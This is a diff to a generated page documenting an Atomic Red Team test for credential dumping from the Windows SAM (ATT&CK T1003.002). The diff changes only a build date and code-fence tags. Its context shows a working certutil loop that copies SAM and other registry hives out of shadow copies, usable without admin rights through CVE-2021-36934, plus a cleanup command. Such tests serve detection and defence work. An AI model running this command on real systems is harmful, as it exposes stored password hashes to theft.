@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.002"
 attack_technique_name: "OS Credential Dumping: Security Account Manager"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "eeb9751a-d598-42d3-b11c-c122d9c3f6c7"
@@ -59,13 +59,13 @@ This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mit
 
 ### Command
 
-```commandprompt
+```cmd
 for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
 ```
 
